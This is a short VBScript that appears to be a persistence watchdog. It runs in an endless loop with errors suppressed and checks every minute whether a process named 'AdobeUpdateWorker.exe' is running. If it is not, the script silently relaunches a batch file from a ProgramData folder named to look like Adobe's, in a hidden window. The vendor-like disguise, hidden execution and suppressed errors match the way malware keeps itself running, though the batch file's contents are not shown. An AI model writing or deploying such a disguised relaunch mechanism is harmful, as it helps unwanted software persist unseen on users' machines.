On error resume next
Set WshShell = WScript.CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
do
WScript.Sleep 60000
Running = False
Set colItems = objWMIService.ExecQuery("Select * from Win32_Process")
For Each objItem in colItems
If objItem.Name = "AdobeUpdateWorker.exe" Then
Running = True
Exit For
End If
Next
If Not Running Then
WshShell.Run "C:\ProgramData\Adobe\AdobeUpdateTool\update.bat", 0
End if
Loop